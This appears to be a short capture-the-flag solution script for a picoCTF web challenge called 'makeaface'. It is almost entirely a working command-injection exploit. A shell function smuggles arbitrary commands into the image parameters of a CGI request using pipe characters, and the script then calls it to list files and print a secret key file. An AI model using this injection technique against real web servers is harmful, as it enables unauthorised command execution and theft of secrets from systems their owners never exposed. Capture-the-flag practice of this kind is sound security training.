function try() { curl "http://makeaface.picoctf.com/index.cgi?Head=3.bmp|$1|&Hair=2.bmp|$1|&Nose=3.bmp|$1|&Mouth=2.bmp|$1|&Eyes=2.bmp|$1|"\; }
try "ls"
try "cat+SECRET_KEY_2b609783951a8665d8c67d721b52b0f8"
